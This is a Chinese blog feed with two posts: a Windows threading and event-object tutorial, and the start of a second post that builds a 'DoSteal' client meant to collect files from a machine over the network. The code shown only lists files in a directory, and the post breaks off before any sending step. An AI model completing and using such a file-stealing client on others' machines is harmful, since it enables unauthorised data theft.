(HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfOthers, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/021.png" class=""><p>统计也没问题，其它字符串看似多一个，是因为统计了字符串末尾的0。</p><p>如果不想输出这个末尾的0，就改一下就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>-1的事。</p><p>当然还不是事件对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];<span class="comment">//字符串</span></span><br><span class="line">HANDLE hEvent;<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Pleas Input string:\n&quot;</span>,stdout);</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自动重置的事件，初始值为无信号状态</span></span><br><span class="line">hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个线程分别统计A和其它成员个数</span></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfOthers, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程执行完毕后，重置事件为无信号状态</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);</code><br>第二个参数提到过，如果为TRUE，则事手动重置事件对象，即该对象需要用ResetEvent去重置为非信号对象。而FALSE则是自动重置事件对象，单个线程被释放之后就会重置为非信号。</p><p>像上述代码事实上阻塞的是hTread1和2两个线程让他挨个跑完得到结果，那么个人感觉event没什么关系了。<br>但是不阻塞这两个线程，就有可能发生只有一个线程来得及输出然后main进程就结束了。</p><p>所以按照我的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];<span class="comment">//字符串</span></span><br><span class="line">HANDLE hEvent;<span class="comment">//句柄</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Pleas Input string:\n&quot;</span>,stdout);</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自动重置的事件，初始值为有信号状态</span></span><br><span class="line">hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个线程分别统计A和其它成员个数</span></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfOthers, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程执行完毕后，重置事件为无信号状态</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我这么设计的event<code>hEvent = CreateEvent(NULL, FALSE, TRUE, NULL);</code><br>它是自动重置，初始值有信号的事件对象。</p><p>那么我两个线程就很好处理了，它默认有信号，就提前wait等待，不管哪个线程先执行，都是有信号的状态，用完之后event自动重置无信号了，我们在线程快结束前给他SetEvent，在设置成有信号的事件，那么下一个线程调用就没有问题了。</p><img src="/2022/07/18/thread/022.png" class=""><p>效果是到位了，如果我在某个线程wait之后没有set，那么有一个线程就会没法跑了。亲测有效。</p><p>那么如果是自动重置，初始无信号。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始无信号，那么进入线程之前就要先设置信号，然后wait。虽然这样操作有点儿比了。但是至少了解一下用法。</p><img src="/2022/07/18/thread/023.png" class=""><p>不然实在是感受不到这种所谓的信号带来的影响？</p><blockquote><p>ps:阻塞线程和system好像都差不多，学这个我感觉自己越来越糊涂。</p></blockquote><hr><p>这种统计的可能不是很好的体现出事件对象的特点</p><p>那么可以来一个卖票的情况。<br>假设两个窗口，一共10或者100张票，依次卖票，而两个线程谁多谁少只能看cpu。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> piao = <span class="number">100</span>;</span><br><span class="line">HANDLE sigHand;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口1开始卖票!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(sigHand, INFINITE);</span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口1售出第%d张票...\n&quot;</span>, piao);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);<span class="comment">//给打印什么的留点时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(sigHand);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口2开始卖票!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(sigHand, INFINITE);</span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口2售出第%d张票...\n&quot;</span>, piao);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);<span class="comment">//给打印什么的留点时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(sigHand);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;开始卖票！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hOne, hTwo;</span><br><span class="line">hOne = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">hTwo = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//自动重置 初始化无信号</span></span><br><span class="line">sigHand = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//手动设置信号</span></span><br><span class="line"><span class="built_in">SetEvent</span>(sigHand);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);<span class="comment">//两个线程跑起来要点时间的。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//怕一闪而过，阻塞一下控制台</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(sigHand);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hOne);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hTwo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这是<code>sigHand = CreateEvent(NULL, FALSE, FALSE, NULL);</code><br>自动重置，初始无信号的情况，所以我们要先手动设置信号，这样两个线程才能wait到信号，然后运行完重新设置信号，以便于另一个进程使用。</p><img src="/2022/07/18/thread/024.png" class=""><p>100有点长就不截图了。</p><p>其余事件对象方式不再做示范，有兴趣自己玩玩容易理解。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>tmd，很杂，真的很杂，而且有些地方要看半天调几下~后面能记住多少是另一码事了。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络截取文件</title>
      <link href="/2022/07/16/winFiles/"/>
      <url>/2022/07/16/winFiles/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>当然基础的截取，肯定先知道ip地址，然后权限开放程度高点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Steal start!\n&quot;</span>);</span><br><span class="line"><span class="built_in">DoSteal</span>(<span class="string">&quot;E:\\mysdk\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>“E:&#x2F;mysdk”，使用反斜杠的做法同样有效，似乎是起源于unix写法，linux也很好的传承了，比如&#x2F;etc&#x2F;hosts之类的，而双斜杠自然是为了转译，毕竟单斜杠就会转译后面的字符了，如果是中文那才是真的gg。</strong></p><hr><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>能够多次使用，就做一个函数，传递的自然是文件路径，就用字符串，为了保证不被修改，加上const修饰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH];<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/16/winFiles/000.png" class=""><p>善用工具和文档，可以节省一些问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line"><span class="built_in">FindFirstFile</span>((LPCTSTR)searFilePath, &amp;FindFileData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>searFilePath毕竟是char类型，要么强转，要么修改项目字符类型为多字节吧。</p><p>然后这边编译器其实会对strcpy和strcat报错，原因在于vs认为这俩函数不安全，建议你用_s的函数，但是这里不考虑这么搞，就强制取消对这个</p><img src="/2022/07/16/winFiles/001.png" class=""><p>4996问题报错，把它关了。</p><img src="/2022/07/16/winFiles/002.png" class=""><p>然后在编译就没啥问题了。</p><p>额，这边后面有报错字符类型转换问题，那干脆还是修改项目字符类型为多字节吧。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(searFilePath, &amp;FindFileData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历，毕竟是通配符*</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(mypath, filePath);<span class="comment">//copy路径</span></span><br><span class="line"><span class="built_in">strcat</span>(mypath, FindFileData.cFileName);<span class="comment">//将其文件名拼接到路径后面</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>,mypath);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile,&amp;FindFileData));<span class="comment">//FindNextFile返回值NULL则表示结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后跑一遍</p><img src="/2022/07/16/winFiles/003.png" class=""><p>看到结果是正常的。</p><p>路径显示正常了，就需要读出单个文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 